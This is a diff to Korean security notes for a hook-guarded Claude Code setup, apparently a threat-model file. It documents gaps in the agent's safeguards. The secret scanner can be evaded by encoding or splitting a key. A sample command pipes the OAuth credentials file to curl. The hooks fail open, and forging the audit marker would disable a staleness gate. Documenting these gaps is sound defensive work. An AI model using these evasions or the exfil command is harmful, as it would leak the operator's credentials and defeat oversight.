@@ -14,6 +14,13 @@
   - 완화: `enforce-secret-scan`(시크릿 유출 차단) + `enforce-rpi-bash`(셸 코드작성 게이트).
   - 잔여 위험(미완화): 임의 Bash 실행 자체는 막지 않음 — 신뢰 운영자 가정에 기댄다.
     더 강한 자세가 필요하면 `defaultMode`를 `default`/`acceptEdits`로 바꾸고 allowlist 운영할 것.
+  - **배포 자세 분기**: 위 bypassPermissions 자세는 이 *운영본*(live `settings.json`)의 선택이다.
+    배포 템플릿 `settings.example.json`은 `defaultMode: default`(프롬프트 ON)로 출하되고 install.sh가 이를 복사하므로 **신규 설치자는 default 자세로 시작**한다 — bypass는 의식적 전환.
+  - **fail-open 신뢰베이스**: `require_node`(node 부재)·파서 런타임 실패 시 차단 hook은 통과(fail-open)한다 — `hooks/_common.sh` 무결성 + PATH상 `node` 존재가 전제. 침해 시 모든 경계가 침묵 무력화(세션-시작 selfcheck가 node-missing/syntax만 차기 표면화).
+
+## audit 마커 (§3 staleness 게이트)
+- `~/.claude/CLAUDE.md`의 `<!-- audit: YYYY-MM-DD -->`는 마지막 *실제* 점검 시점. session-start-audit이 30일 초과 시 알림(읽기 전용).
+- **갱신은 human/audit 전용** (cycle-29): doctor.sh는 부재 시 부트스트랩만 하고 기존 마커는 *보존*한다 — doctor 실행이 신선도를 위조하면 게이트가 영구 무력화되고 CLAUDE.md 수정이 §1 캐시를 무효화하기 때문. 31일째 게이트가 발화하면 운영자가 실제 점검 후 마커를 수동 갱신하는 것이 정상 흐름.
 
 ## 자격증명 (Credentials)
 - `~/.claude/.credentials.json` 는 Claude Code가 관리하는 OAuth 토큰 저장소(평문).
@@ -28,7 +35,10 @@
   (Anthropic / AWS / GitHub / GitLab / Slack / Google 키, PEM private-key 블록)을 탐지하면 차단(exit 2).
 - placeholder(`XXXX`/`REDACTED`/`EXAMPLE`/`your-key`/`DUMMY`/`FAKE`…)는 통과. 값은 절대 로그하지 않음(종류만 기록).
 - 우회: `export SECRET_SCAN_SKIP="<이유>"`.
-- **한계**: 시그니처 기반 → 미지의 키 포맷·난독화된 시크릿·PII는 탐지 못 함. 1차 방어선일 뿐 완전하지 않다.
+- **한계 (typo/accident 가드 — exfil control 아님)**: 시그니처 기반 → 미지 키 포맷·PII 미탐지.
+  - **인코딩/분할 우회**: `base64`·hex·변수 분할 기입(`P1=sk-..; P2=..; echo $P1$P2`)은 전부 무력화 → 사실상 *우발적 평문 유출* 가드이지 적대적 exfil 차단이 아니다.
+  - **콘텐츠 전용**: 파일을 *읽어* 네트워크로 내보내는 명령(`cat ~/.claude/.credentials.json | curl -d @-`)은 리터럴 키가 명령문에 없어 통과 — egress 필터링은 의도적 범위 밖(단일운영자 가정).
+  - **인바운드 미검사**: `Read`/`WebFetch`/MCP로 *들어오는* 시크릿은 검사 안 함(PreToolUse 출력측 전용). 비대칭은 신뢰 운영자 가정에 기댄 수락 잔여.
 
 ## `enforce-rpi-bash` 보수차단 / 잔여 (cycle-23)
 - **보수차단**: `git apply`/`patch`는 쓰기 타깃이 패치 *내용*에 있어 명령행 추출 불가 → active plan 부재 시 명령 단위로 차단(read-only 변형 `--check`/`--stat`/`--numstat`/`--summary`는 통과). docs 전용 패치 오탐은 `RPI_SKIP`으로 우회.
